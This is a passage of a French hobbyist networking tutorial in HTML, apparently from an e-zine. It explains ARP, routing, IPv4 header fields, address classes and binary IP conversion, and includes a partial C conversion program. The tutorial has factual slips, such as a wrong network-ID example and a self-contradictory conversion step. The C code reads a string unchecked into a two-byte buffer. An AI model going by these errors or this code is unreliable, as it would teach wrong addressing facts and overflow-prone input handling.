    certaine correspondance entre les adresses IP et les adresses physiques. Cette 
    table ARP consttitue le lien entre l'adresse IP et l'adresse physique d'une 
    interface r&eacute;seau.</font></p>
  <p><font color="#FFFFFF">Afin d'envoyer des donn&eacute;es sur un r&eacute;seau 
    rout&eacute; ( c'est &agrave; dire o&ugrave; le trafic est r&eacute;orient&eacute; 
    gr&acirc;ce &agrave; un routeur), le logiciel TCP/IP utilise les strat&eacute;gies 
    suivantes :</font></p>
  <p><font color="#FFFFFF">1. Si l'adresse de destination est sur le m&ecirc;me 
    segment de r&eacute;seau que la machine &eacute;mettrice, celle-ci envoie 
    le paquet de donn&eacute;es (<em><font color="#33CC99">trame</font></em>) 
    directement &agrave; la destination. L'adresse IP est transform&eacute;e en 
    adresse physique gr&acirc;ce &agrave; ARP et les donn&eacute;es sont redirig&eacute;es 
    vers l'interface r&eacute;seau de destination.</font></p>
  <p><font color="#FFFFFF">2.Si l'adresse de destination est situ&eacute;e sur 
    un autre segment de r&eacute;seau que celui de la machine &eacute;mettrice, 
    le processus suivant commence :</font></p>
</div>
<blockquote> 
  <div align="left"> 
    <p><font color="#FFFFFF">_Le datagramme est dirig&eacute; vers une passerelle. 
      L'adresse de la passerelle est transform&eacute;e en adresse physique &agrave; 
      l'aide de ARP et les donn&eacute;es sont envoy&eacute;es &agrave; l'interface 
      r&eacute;seau de la passerelle.</font></p>
    <p><font color="#FFFFFF">_Le datagremme est rout&eacute;, au travers de la 
      passerelle, vers un segment de plus haut niveau o&ugrave; ce processus est 
      r&eacute;p&eacute;t&eacute;. Si l'adresse de destination appartient au nouveau 
      segment, les donn&eacute;es sont transmises &agrave; la destination. Sinon 
      le datagramme est retransmis &agrave; un autre routeur.</font></p>
    <p><font color="#FFFFFF">_Le datagramme traverse une cha&icirc;ne de routeurs 
      jusqu'au segment de destination sur lequel ARP &eacute;tablit une correspondance 
      entre l'adresse IP de destination et l'adresse physique. Ainsi, les donn&eacute;es 
      sont retransmises &agrave; l'interface r&eacute;seau de destination.</font></p>
    <p align="center"><font color="#FFFFFF"><img src="M.I.B Mag #1_fichiers/Figure%204.JPG" width="675" height="240"></font></p>
    <p align="center"><em><font color="#FFFFFF" face="Times New Roman, Times, serif">Figure 
      4 : la passerelle re&ccedil;oit des datagrammes (paquets de donn&eacute;es) 
      destin&eacute;s &agrave; d'autres r&eacute;seaux </font></em></p>
  </div>
</blockquote>
<div align="left"> 
  <p><font color="#FFFFFF" face="Times New Roman, Times, serif">Afin de d&eacute;livrer 
    des donn&eacute;es sur un r&eacute;seau rout&eacute;, les protocoles de la 
    couche Internet doivent, par cons&eacute;quent, &ecirc;tre capables :</font></p>
</div>
<blockquote> 
  <div align="left"> 
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_d'identifier 
      toute machine du r&eacute;seau ;</font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_de d&eacute;terminer 
      si un message doit transiter par un routeur ;</font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_de fournir 
      un moyen permettant de d&eacute;terminer le segment r&eacute;seau de destination 
      ;</font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_de fournir 
      un moyen permettant de convertir l'adresse IP logique de la machine de destinationen 
      une adresse physique pour que les donn&eacute;es soient d&eacute;livr&eacute;es 
      &agrave; l'interface r&eacute;seau de la machine de destination.</font></p>
    
</div>
  <blockquote>
    <div align="left">
      <p>&nbsp;</p>
      <p><font color="#FFFFFF" face="Times New Roman, Times, serif"><em>2)<strong> 
        </strong><u>Protocole Internet (IP)</u></em></font></p>
    </div>
  </blockquote>
</blockquote>
<p><font color="#FFFFFF">Le protocole IP permet un syst&egrave;me d'adressage 
  hierarchique, ind&eacute;pendant du mat&eacute;riel, et offre les services n&eacute;cessaires 
  &agrave; la d&eacute;livrance de donn&eacute;es au travers d'un r&eacute;seau 
  rout&eacute;, il est responsable de l'&eacute;laboration des datagrames, de 
  leur acheminement et de leur traitement &agrave; la r&eacute;ception. Chaque 
  interface (<em>carte</em>) r&eacute;seau d'un r&eacute;seau TCP/IP dispose d'une 
  adresse IP unique.</font></p>
<p><font color="#FFFFFF">Les adresses IP d'un r&eacute;seau sont organis&eacute;es 
  de telle fa&ccedil;on que l'emplacement d'une machine soit d&eacute;fini par 
  son adresse.</font></p>
<p><font color="#FFFFFF">Une adresse IP est un nombre cod&eacute; sur 32 bits 
  ( 4 octets ) qui ressemble &agrave; &ccedil;a :</font></p>
<div align="center"></div>
<div align="center"> 
  <table width="10%" border="1" bordercolor="#FF0000">
    <tr> 
      <td bordercolor="#FF0000" bgcolor="#FFFFFF"><div align="center"><font color="#000000"><strong>190.154.28.15</strong></font></div></td>
    </tr>
  </table>
  <p align="left">&nbsp;</p>
  <p align="left"><font color="#FFFFFF">Une adresse IP contient :</font><br>
    <font color="#FFFFFF">_ une partie d&eacute;signant le r&eacute;seau et le 
    sous r&eacute;seau : on parle d</font><font color="#339933"><em>'<font color="#33CC99">ID 
    r&eacute;seau</font></em></font><font color="#FFFFFF"> ---&gt; ici : <strong><em>154</em></strong></font><br>
    <font color="#FFFFFF">_ une partie d&eacute;signant v&ocirc;tre machine sur 
    ce r&eacute;seau : on parle d</font>'<em><font color="#33cc99">ID h&ocirc;te</font></em> 
    ---&gt; ici : <em><strong>15</strong></em></p>
</div>
  
<blockquote> 
  <p>&nbsp;</p>
  <blockquote>
    <p><font color="#FFFFFF"><em>3) <u>Champs d'en-t&ecirc;te IP</u></em></font></p>
  </blockquote>
</blockquote>
<p><font color="#FFFFFF">Chaque datagramme IP commence par un en-t&ecirc;te IP. 
  C'est le logiciel TCP/IP de la machine &eacute;mettrice qui construit l'en-t&ecirc;te 
  IP. Le logiciel TCP/IP de la machine de destination utilise l'informmation cod&eacute;e 
  dans l'en-t&ecirc;te IP afin de traiter ce datagramme.</font></p>
<p><font color="#FFFFFF">La taille minimale d'un en-t&ecirc;te IP est de 20 octets 
  :</font></p>
<div align="center"> 
  <table width="75%" border="1">
    <tr> 
      <td width="13%" bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Version</font></div></td>
      <td width="12%" bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">IHL</font></div></td>
      <td width="25%" bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">TOS</font></div></td>
      <td width="50%" bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Longueur 
          totale</font></div></td>
    </tr>
  </table>
  <table width="75%" border="1">
    <tr> 
      <td width="50%" bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Identification</font></div></td>
      <td width="15%" bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Drapeau</font></div></td>
      <td width="35%" bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">D&eacute;calage 
          de framents</font></div></td>
    </tr>
  </table>
  <table width="75%" border="1">
    <tr> 
      <td width="25%" bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Dur&eacute;e 
          de vie</font></div></td>
      <td width="25%" bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Protocole</font></div></td>
      <td width="50%" bgcolor=#000066> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Somme 
          de contr&ocirc;le de l'en-t&ecirc;te</font></div></td>
    </tr>
  </table>
  <table width="75%" border="1">
    <tr> 
      <td bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Adresse 
          IP source</font></div></td>
    </tr>
    <tr> 
      <td bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Adresse 
          IP de destination</font></div></td>
    </tr>
  </table>
  <table width="75%" border="1">
    <tr> 
      <td width="75%" bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Options 
          IP (optionnel)</font></div></td>
      <td width="25%" bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Bits 
          de bourrage</font></div></td>
    </tr>
  </table>
  <table width="75%" border="1">
    <tr> 
      <td bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Donn&eacute;es</font></div></td>
    </tr>
    <tr> 
      <td bgcolor="#000066"> <div align="center"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">Champs 
          r&eacute;serv&eacute; &agrave; d'autres possibles donn&eacute;es</font></div></td>
    </tr>
  </table>
  <p align="left"><font color="#FFFFFF">Les champs de l'en-t&ecirc;te IP sont 
    :</font></p>
</div>
<blockquote> 
  <div align="left"> 
    <p><font color="#FFFFFF">_</font><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif">&quot;</font><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">Version</font><font color="#FFFFFF">&quot; 
      :<font face="Times New Roman, Times, serif"> ce champ de 4 bits indique 
      la version IP. La version actuelle est la 4. </font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FFFFFF" size="2"><strong>IHL</strong></font><font color="#FFFFFF">&quot; 
      <em><font face="Times New Roman, Times, serif">ou </font></em></font>&quot;<strong><font color="#FFFFFF" size="2">I</font></strong><font color="#FF0000" size="2">nternet 
      <strong><font color="#FFFFFF">H</font></strong>earder <strong><font color="#FFFFFF">L</font></strong>enght</font><font color="#FFFFFF">&quot; 
      : <font face="Times New Roman, Times, serif">longueur de l'en-t&ecirc;te. 
      Ce champ de 4 bits repr&eacute;sente la longueur de l'en-t&ecirc;te IP en 
      mots de 32 bits. </font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FFFFFF" size="2"><strong>TOS</strong></font><font color="#FFFFFF">&quot;<font face="Times New Roman, Times, serif"><em><font face="Times New Roman, Times, serif"> 
      ou</font></em></font></font> <font color="#FFFFFF">&quot;</font><strong><font color="#FFFFFF" size="2">T</font></strong><font color="#FF0000" size="2">ype 
      <strong><font color="#FFFFFF">O</font></strong>f <strong><font color="#FFFFFF">S</font></strong>ervice</font><font color="#FFFFFF">&quot; 
      : <font face="Times New Roman, Times, serif">type de service. Le but initial 
      de ce champ de 8 bits est de prioriser le passage de datagrammes au travers 
      d'un routeur. Il est souvent remplit par des 0.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">Longueur 
      total</font><font color="#FFFFFF">&quot; :<font face="Times New Roman, Times, serif"> 
      ce champs de 16 bits repr&eacute;sente la longueur, en octet, du datagramme 
      IP. Cette longueur inclut l'en-t&ecirc;te IP et les donn&eacute;es utiles.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">Identification</font><font color="#FFFFFF">&quot; 
      : <font face="Times New Roman, Times, serif">ce champs de 16 bits est un 
      num&eacute;ro de s&eacute;quence assign&eacute; aux messages &eacute;mis 
      par la source IP.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Ar???????i?i?i?i???????????????????=???????????????????Oi???ial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Ar???????i?i?i?i???????????????????=???????????????????Oi???ial, Helvetica, sans-serif"><font color="#FF0000" size="2">Drapeaux</font><font color="#FFFFFF">&quot; 
      : <font face="Times New Roman, Times, serif">ce champs pr&eacute;cise les 
      possiblit&eacute;s de framentation. En effet lorsqu'un message est envoy&eacute; 
      &agrave; la couche IP et qu'il est trop large pour &ecirc;tre </font><font face="Times New Roman, Times, serif">contenu 
      dans un datagramme, IP le framente en plusieurs datagrammes en attribuant 
      le m&ecirc;me identificateur &agrave; chaque datagramme.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">D&eacute;calage(offset 
      ) de framents</font><font color="#FFFFFF">&quot; :<font face="Times New Roman, Times, serif"> 
      ce champs de 13 bits est une valeur num&eacute;rique assign&eacute;e &agrave; 
      chaque frament sucessif. A la destination, IP utilise ce param&egrave;tre 
      pour r&eacute;assembler les framents dans l'ordre.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">Dur&eacute;e 
      de vie</font><font color="#FFFFFF">&quot; <em><font face="Times New Roman, Times, serif">ou 
      </font></em>&quot;<font size="2"><strong>TTL</strong></font>&quot;(=</font><strong><font color="#FFFFFF" size="2">T</font></strong><font color="#FF0000" size="2">ime 
      <strong><font color="#FFFFFF">T</font></strong>o <strong><font color="#FFFFFF">L</font></strong>ive</font><font color="#FFFFFF">) 
      : <font face="Times New Roman, Times, serif">ce champs de 8 bits indique 
      la dur&eacute;e en secondes, ou le <em>nombre de sauts de routeurs</em>, 
      pendant laquelle le datagramme peut survivre avant d'&ecirc;tre rejet&eacute;.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">Protocole</font><font color="#FFFFFF">&quot; 
      :<font face="Times New Roman, Times, serif"> ce champs de 8 bits indique 
      quel est le protocole qui traitera les donn&eacute;es utiles. Par exemple 
      l'identificateur de protocole de TCP est 6.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">Somme 
      de contr&ocirc;le de l'en-t&ecirc;te</font><font color="#FFFFFF">&quot; 
      : <font face="Times New Roman, Times, serif">ce champs est un entier calcul&eacute; 
      de 16 bits permettant de v&eacute;rifier la seule int&eacute;grit&eacute; 
      de l'en-t&ecirc;te.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">Adresse 
      IP source</font><font color="#FFFFFF">&quot; : <font face="Times New Roman, Times, serif">ce 
      champs de 32 bits contient l'adresse de la source du datagramme.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">Adresse 
      IP de destination</font><font color="#FFFFFF">&quot; : <font face="Times New Roman, Times, serif">ce 
      champs de 32 bits contient l'adresse de destination du datagramme et il 
      est utilis&eacute; pour assurer la d&eacute;livrance correcte &agrave; la 
      machine destinatrice.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">Options 
      IP</font><font color="#FFFFFF">&quot; : <font face="Times New Roman, Times, serif">ce 
      champs contient des param&egrave;tres optionnels de l'en-t&ecirc;te, destin&eacute;s 
      initialement aux tests, au d&eacute;bogage et &agrave; la s&eacute;curit&eacute;.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">Le 
      bourrage</font><font color="#FFFFFF">&quot; : <font face="Times New Roman, Times, serif">ce 
      champs de bourrage rajoute des 0 de telle fa&ccedil;on que la longueur totale 
      de l'en-t&ecirc;te soit un multiple de 32 bits.</font></font></font></font></p>
    <p><font color="#FFFFFF" face="Times New Roman, Times, serif">_<font face="Verdana, Arial, Helvetica, sans-serif">&quot;</font></font><font face="Times New Roman, Times, serif"><font face="Verdana, Arial, Helvetica, sans-serif"><font color="#FF0000" size="2">Charge 
      utile</font><font color="#FFFFFF">&quot; : <font face="Times New Roman, Times, serif">ce 
      champs contient les donn&eacute;es destin&eacute;es &agrave; &ecirc;tre 
      transmises aux couches TCP, UDP, ICMP ou IGMP.</font></font></font></font></p>
    <p>&nbsp;</p>
  </div>
  <blockquote> 
    <div align="left"><font color="#FFFFFF" face="Times New Roman, Times, serif"><em>4) 
      <u>Adressage IP </u></em></font></div>
  </blockquote>
</blockquote>
<p><em><u><font color="#FFFFFF">Rappel </font></u><font color="#FFFFFF">: </font></em><font color="#FFFFFF">une 
  adresse IP est un nombre de binaire de 32 bits. Cette adresse de 32 bits est 
  sous-divis&eacute;e en quatre segments de 8 bits appel&eacute;e</font> <em><font color="#33cc99">octet</font></em><font color="#FFFFFF">.</font></p>
<p><font color="#FFFFFF">Une partie de l'adresse IP est utilis&eacute;e pour l'identificateur 
  de r&eacute;seau et une autre pour l'identificateur de machine. La partie de 
  l'adresse correspondant &agrave; l'identificateur de r&eacute;seau varie en 
  fonction de celle-ci. La plupart des adresses IP sont regroup&eacute;es dans 
  les classes suivantes :</font></p>
<p>&nbsp;</p>
<div align="center"> 
  <table width="52%" border="1">
    <tr> 
      <td width="65%" bordercolor="#000099"> <div align="center"><font color="#339999">Premier 
          segment de l'adresse IP</font></div></td>
      <td width="35%" bordercolor="#000099"> <div align="center"><font color="#339999">Classe 
          d'adresse</font></div></td>
    </tr>
    <tr> 
      <td><div align="center"><font color="#FFFFFF">0 &agrave; 127</font></div></td>
      <td><div align="center"><font color="#FFFFFF">A</font></div></td>
    </tr>
    <tr> 
      <td><div align="center"><font color="#FFFFFF">128 &agrave; 191</font></div></td>
      <td><div align="center"><font color="#FFFFFF">B</font></div></td>
    </tr>
    <tr> 
      <td><div align="center"><font color="#FFFFFF">192 &agrave; 223</font></div></td>
      <td><div align="center"><font color="#FFFFFF">C</font></div></td>
    </tr>
  </table>
  <p>&nbsp;</p>
</div>
<blockquote> 
  <blockquote> 
    <p><font color="#FFFFFF"><em>5) <u>Convertion d'une adresse binaire de 32 
      bits au format d&eacute;cimal point&eacute;</u></em></font></p>
  </blockquote>
</blockquote>
<p align="left"><font color="#FFFFFF">Une adresse IP au format binaire de 32 bits 
  est tr&egrave;s difficile &agrave; manipuler, il est donc indispensable de savoir 
  l'a convertire au format d&eacute;cimal point&eacute;. </font></p>
<p align="left"><font color="#FFFFFF"><em>Conversion format binaire au format 
  d&eacute;cimal</em></font></p>
<p align="left"><font color="#FFFFFF">Les nombres binaires (base 2) sont identiques 
  aux nombres d&eacute;cimaux (base 10), si ce n'est qu'il s'agit de multiples 
  de 2 au lieu de multiples de 10. La valeur d'un nombre d&eacute;cimal est la 
  somme des valeurs de chaque rang. Par exemple, la valeur du nombre d&eacute;cimal 
  126.325 s'exprime sous la forme : (1*100.000) + (2*10.000) + (6*1000) + (3*100) 
  + (2*10) + (5*1) = 126.325.<br>
  Pour d&eacute;terminer l'&eacute;quivalent d&eacute;cimal d'une valeur binaire, 
  il faut ajouter les valeurs de chaque bit valant 1. N'oubliez pas que l'adresse 
  IP est constitu&eacute; de quatre octets qui doivent &ecirc;tre convertis s&eacute;par&eacute;ment 
  au format d&eacute;cimal. Voici un exemple de conversion d'une adresse IP binaire 
  sur 32 bits au format d&eacute;cimal point&eacute; :</font><br>
  <font color="#FFFFFF">Convertissons l'adresse binaire -&gt; </font><font color="#00FF99">01011001000111011100110000011000</font></p>
<p><font color="#00CCFF">1&egrave;re &eacute;tape</font><font color="#FFFFFF"> 
  -&gt; Eclatons l'adresse en octet de 8 bits :</font><br>
  <font color="#FFFFFF">OCTET 1 :</font> <font color="#00ff99">01011001</font><br>
  <font color="#FFFFFF">OCTET 2 :</font> <font color="#00FF99">00011101</font><br>
  <font color="#FFFFFF">OCTET 3 : </font><font color="#00FF99">11001100</font><br>
  <font color="#FFFFFF">OCTET 4 : </font><font color="#00FF99">00011000</font></p>
<p><font color="#00CCFF">2&egrave;me &eacute;tape</font><font color="#FFFFFF"> 
  -&gt; Convertissons chaque octet en nombre d&eacute;cimal :<br>
  Prenez l'octet 1 et r&eacute;&eacute;crivez le en partant du d&eacute;but et 
  en &eacute;crivant de haut en bas puis multipliez chaque terme par le multiple 
  de 2 qui lui correspond en partant toujours de 1 et cette fois en partant du 
  bas por allez vers le haut :<br>
  0*128 = 0<br>
  1*64 = 64<br>
  0*32 = 0<br>
  1*16 = 16<br>
  1*8 = 8<br>
  0*4 = 0<br>
  0*2 = 0<br>
  1*1 = 1<br>
  On obtient ainsi pour le 1er octet : 1+0+0+8+16+0+64+0 = 89<br>
  Par la m&ecirc;me m&eacute;thode on obtient pour l'octet 2 : 1+4+8+16 = 29<br>
  ---------------------------------------------3 : 4+8+64+128 = 204<br>
  ---------------------------------------------4 : 8+16 = 24</font></p>
<p><font color="#FFFFFF">3&egrave;me &eacute;tape -&gt; Ecrivons les valeurs d&eacute;cimales 
  &eacute;quivalentes de la gauche vers la droite, en les s&eacute;parant par 
  des points : l'adresse devient </font><font color="#00FF99">89.29.204.24</font></p>
<p>&nbsp; </p>
<p><font color="#FFFFFF"><em>Conversion d'un nombre d&eacute;cimal en un octet 
  binaire </em><br>
  <br>
  Si vous souhaitez convertir une adresse d&eacute;cimale point&eacute;e en une 
  adresse binaire sur 32 bits, convertissez chaque segment de cette adresse en 
  un octet binaire, convertissons le d&eacute;cimal 207 en un octet binaire :</font></p>
<p><font color="#FFFFFF">1.Comparons le d&eacute;cimal 207 &agrave; 128. Si le 
  nombre d&eacute;cimal est sup&eacute;rieur ou &eacute;gal &agrave; 128, &ocirc;tons 
  128 et reportons un 1. Si le nombre d&eacute;cimal est inf&eacute;rieur &agrave; 
  128, soustrayons 0 et &eacute;crivons un 0.<br>
  207&gt;128<br>
  207-128 = 79<br>
  Ecrivons 1 dans le bit de poids 128</font><br>
  <font color="#3399FF">La r&eacute;ponse est 1</font></p>
<p><font color="#FFFFFF">2.Prenons le r&eacute;sultat de l'&eacute;tape 1 (79 
  dans ce cas) et comparons-le au nombre 64. Si le nombre d&eacute;cimal es t 
  sup&eacute;rieur ou &eacute;gal &agrave; 64, &ocirc;tons 64 et reportons 1. 
  Si le nombre d&eacute;cimal est inf&eacute;rieur &agrave; 64, &ocirc;tons 0 
  et reportons un 0.<br>
  79&gt;64<br>
  79-64 = 15<br>
  Ecrivons 1 dans le bit de poids 64</font><br>
  <font color="#3399FF">La r&eacute;ponse est 11</font></p>
<p><font color="#FFFFFF">3.Prenons le r&eacute;sultat de l'&eacute;tape 2 (15 
  dans ce cas) et comparons-le au nombre 32. Si le nombre d&eacute;cimal est sup&eacute;rieur 
  ou &eacute;gal &agrave; 32, &ocirc;tons 32 et reportons un 1. Si le nombre d&eacute;cimal 
  est inf&eacute;rieur &agrave; 32, &ocirc;tons 0 et reportons un 0.<br>
  15&lt;32<br>
  15-0 = 15<br>
  Ecrivons 0 dans le bit de poids 32</font><br>
  <font color="#3399FF">La r&eacute;ponse est 110</font></p>
<p><font color="#FFFFFF">4.Comparons le r&eacute;sultat de l'&eacute;tape 3 au 
  nombre 16. Si le nombre est sup&eacute;rieur &agrave; 16, &ocirc;tons 16 et 
  reportons un 1. Si le nombre est inf&eacute;rieur &agrave; 16, &ocirc;tons 0 
  et reportons un 0.<br>
  15&lt;16<br>
  15-0 = 15<br>
  Ecrivons 0 dans le bit de poids 16</font><br>
  <font color="#3399FF">La r&eacute;ponse est 1100</font></p>
<p><font color="#FFFFFF">5.Comparons le r&eacute;sultat de l'&eacute;tape 4 au 
  nombre 8. Si le nombre d&eacute;cimal est sup&eacute;rieur ou &eacute;gal &agrave; 
  8, &ocirc;tons 8 et reportons un 1. Si le nombre d&eacute;cimal est inf&eacute;rieur 
  &agrave; 8, &ocirc;tons 0 et reportons un 0.<br>
  15&gt;8<br>
  15-8 = 7<br>
  Ecrivons 1 dans le bit de poids 8</font><br>
  <font color="#3399FF">La r&eacute;ponse est 11001</font></p>
<p><font color="#FFFFFF">6.Comparons le r&eacute;sultat de l'&eacute;tape 5 au 
  nombre 4. Si le nombre d&eacute;cimal est inf&eacute;rieur &agrave; 4, &ocirc;tons 
  0 et reportons un 1. Si le nombre d&eacute;cimal est inf&eacute;rieur &agrave; 
  4, &ocirc;tons 0 et reportons un 0.<br>
  7&gt;4<br>
  7-4 = 3<br>
  Ecrivons 1 dans le bit de poids 4</font><br>
  <font color="#3399FF">La r&eacute;ponse est 110011</font></p>
<p><font color="#FFFFFF">7.Comparons le r&eacute;sulat de l'&eacute;tape 6 au 
  nombre 2. Si le nombre d&eacute;cimal est sup&eacute;rieur &agrave; 2, &ocirc;tons 
  2 et reportons un 1. Si le nombre d&eacute;cimal est inf&eacute;rieur &agrave; 
  2, &ocirc;tons 0 et reportons un 0.<font color="#000000">__________________________________________________________________________________________________________ 
  </font>3&gt;2<br>
  3-2 = 1<br>
  Ecrivons 1 dans le bit de poids 2</font><br>
  <font color="#3399FF"> La r&eacute;ponse est 1100111</font></p>
<p><font color="#FFFFFF">8.Si le r&eacute;sultat de l'&eacute;tape 8 est un 1, 
  reportons un 1. Si le r&eacute;sultat de l'&eacute;tape 8 est un 0, reportons 
  0.<br>
  1=1<br>
  Ecrivons 1 &agrave; la place des unit&eacute;s</font><br>
  <font color="#3399FF">La r&eacute;ponse finale est 11001111</font></p>
<p><font color="#FFFFFF">Nous venons ainsi de convertir le nombre d&eacute;cimal</font> 
  <font color="#00FF99">207</font><font color="#FFFFFF"> en son &eacute;quivalent 
  binaire </font><font color="#3399FF">11001111</font>.<br>
</p>
<p align="left"><font color="#FFFFFF" face="Times New Roman, Times, serif">Pour 
  vous faciliter la t&acirc;che, voici un le code source d'un programme en C cod&eacute; 
  par NeoFox (de la team <strong>IOC</strong>) qui va convertir une adresse IP 
  au format binaire :</font></p>
<p align="center">&nbsp;</p>
<p align="center"><font color="#FFFFFF"><em><strong>Binary v.1 par Neo_Fox [IOC]</strong></em></font></p>
<form name="form1" method="post" action="">
  <div align="center">
    <textarea name="textarea" cols="110" rows="225">
/*       
 *
 * 
 *          
 * Binary v.1 va saisir une adresse IP
 * que vous entrez au prompt d'effectuer la conversion
 * en binaire, en appliquant un calcul trés simpliste,
 * mais l'essentiel est que ça marche non ?
 *
 *        neo_fox_2001@hotmail.com
 *
 */



#include <stdio.h>   /* printf, scanf */
#include <stdlib.h>  /* exit */
#include <string.h>  /* strcmp */


/* Nombres saisis*/
int IP1,IP2,IP3,IP4;

/* les nombres une fois transformés en binaire */
char bin1 [10];
char bin2 [10];
char bin3 [10];
char bin4 [10];


int nbre[7];



/* recommencer */
char saisie [2];

/* définition des sous-programmes*/

void calcul1 ();
void calcul2 ();
void calcul3 ();
void calcul4 ();
void clean ();


 main ()
{

	printf("\n\n\n**** \tBinary 1.0 par Neo_Fox \t****\n\n\n");
	prompt :
	printf("\n\nEntrez une Adresse IP au format xxx.xxx.xxx.xxx : ");
	scanf("%d.%d.%d.%d",&IP1,&IP2,&IP3,&IP4);

	/* Si les octets sont > à 255 ou invalides*/
    if (IP1>=256)
		{printf("\n\rErreur de saisie !!)\n");goto prompt;}
	if (IP2>=256)
		{printf("\n\rErreur de saisie !!\n");goto prompt;}
	if (IP3>=256)
		{printf("\n\rErreur de saisie !!\n");goto prompt;}
	if (IP4>=256)
		{printf("\n\rErreur de saisie !!\n");goto prompt;}


        calcul1();
        calcul2();
	calcul3();
	calcul4();


	printf("\n\nDecimal : %d.%d.%d.%d\n",IP1,IP2,IP3,IP4);
	printf("Binaire : %s.%s.%s.%s\n",bin1,bin2,bin3,bin4);

	/* si l'IP = 127.0.0.1 ... */

	if (IP1==127)
		{
		  if (IP2==0)
		    {
			if (IP3==0)
				   {
				       if (IP4==1)
					           {
						   printf("Usage : IP de loopback\n");
				       	            } 
				    }
		     }

		}



	/* Recommencer ?*/
	again :
	printf("\n\nRecommencer y/n ? ");
	scanf("%s",&saisie);
	if ((strcmp(saisie,"y")==0)||(strcmp(saisie,"Y")==0)){clean(); goto prompt;}
	if ((strcmp(saisie,"n")==0)||(strcmp(saisie,"N")==0)){printf("\n\nSortie du Programme !\n\n");
	                                   getchar(); exit(1);}
    else {goto again;}

	return 0;

} /* Fin du main*/

/* Suite de calculs pour déduire la valeur binaire*/

void calcul1 ()
{


